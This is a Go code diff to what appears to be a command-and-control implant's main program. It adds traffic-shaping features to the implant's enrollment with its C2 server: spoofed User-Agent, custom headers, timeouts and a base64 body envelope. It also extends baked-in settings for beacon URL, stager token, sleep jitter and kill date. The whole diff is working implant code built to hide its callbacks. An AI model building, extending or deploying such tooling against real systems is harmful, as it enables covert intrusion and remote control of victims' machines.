@@ -23,6 +23,7 @@ import (
 	"log"
 	"os"
 	"os/signal"
+	"strings"
 	"syscall"
 	"time"
 
@@ -59,8 +60,19 @@ func main() {
 		logger.Fatalf("load CA: %v", err)
 	}
 
-	logger.Printf("enrolling at %s", cfg.EnrollURL)
-	enrollment, err := c2.Enroll(cfg.EnrollURL, cfg.StagerToken, privateKey, serverCAs)
+	// The malleable transport profile (architecture.md Sec 7, M4.3) shapes the
+	// enroll request: a profiled enroll path, User-Agent, custom headers, a
+	// per-request timeout, and an optional base64 body envelope. Built from the
+	// config (flag/env/baked) and applied by the enroll client.
+	transport := c2.TransportProfile{
+		UserAgent:      cfg.Transport.UserAgent,
+		Headers:        cfg.Transport.Headers,
+		RequestTimeout: cfg.Transport.RequestTimeout,
+		Envelope:       envelopeFromString(cfg.Transport.Envelope),
+	}
+	enrollURL := cfg.ResolvedEnrollURL()
+	logger.Printf("enrolling at %s", enrollURL)
+	enrollment, err := c2.Enroll(enrollURL, cfg.StagerToken, privateKey, serverCAs, transport)
 	if err != nil {
 		logger.Fatalf("enroll: %v", err)
 	}
@@ -133,23 +145,52 @@ func seedFromBaked() {
 			return
 		}
 	}
-	var baked map[string]string
+	// The baked JSON mixes scalar string values with a nested "headers" object;
+	// decode into RawMessage so the nested object can be re-emitted as the
+	// ROD_HEADERS JSON-object string config.Parse expects.
+	var baked map[string]json.RawMessage
 	if err := json.Unmarshal(raw, &baked); err != nil {
 		return
 	}
-	// Map baked keys to the same ROD_* env names config.Parse reads; only set env
-	// when it is not already present, so an explicit env always wins over the bake.
+	// Map baked scalar keys to the same ROD_* env names config.Parse reads; only
+	// set env when it is not already present, so an explicit env always wins over
+	// the bake.
 	envMap := map[string]string{
-		"enrollURL": "ROD_ENROLL_URL",
-		"beaconURL": "ROD_BEACON_URL",
-		"token":     "ROD_STAGER_TOKEN",
-		"sleep":     "ROD_SLEEP",
-		"jitter":    "ROD_JITTER",
-		"killDate":  "ROD_KILL_DATE",
+		"enrollURL":      "ROD_ENROLL_URL",
+		"beaconURL":      "ROD_BEACON_URL",
+		"token":          "ROD_STAGER_TOKEN",
+		"sleep":          "ROD_SLEEP",
+		"jitter":         "ROD_JITTER",
+		"killDate":       "ROD_KILL_DATE",
+		"enrollPath":     "ROD_ENROLL_PATH",
+		"userAgent":      "ROD_USER_AGENT",
+		"requestTimeout": "ROD_REQUEST_TIMEOUT",
+		"envelope":       "ROD_ENVELOPE",
 	}
 	for jsonKey, envKey := range envMap {
-		if v, ok := baked[jsonKey]; ok && v != "" && os.Getenv(envKey) == "" {
-			os.Setenv(envKey, v)
+		if msg, ok := baked[jsonKey]; ok && os.Getenv(envKey) == "" {
+			var v string
+			if err := json.Unmarshal(msg, &v); err == nil && v != "" {
+				os.Setenv(envKey, v)
+			}
 		}
 	}
+	// Headers ride as a nested object; re-emit the raw JSON verbatim into
+	// ROD_HEADERS, which config.Parse decodes back into the header map.
+	if msg, ok := baked["headers"]; ok && os.Getenv("ROD_HEADERS") == "" {
+		var headers map[string]string
+		if err := json.Unmarshal(msg, &headers); err == nil && len(headers) > 0 {
+			os.Setenv("ROD_HEADERS", string(msg))
+		}
+	}
+}
+
+// envelopeFromString maps the profile's lowercase envelope name to the c2
+// envelope value. "base64" wraps the enroll body; anything else (including the
+// empty default) sends raw JSON.
+func envelopeFromString(s string) c2.Envelope {
+	if strings.EqualFold(s, "base64") {
+		return c2.EnvelopeBase64
+	}
+	return c2.EnvelopeNone
 }
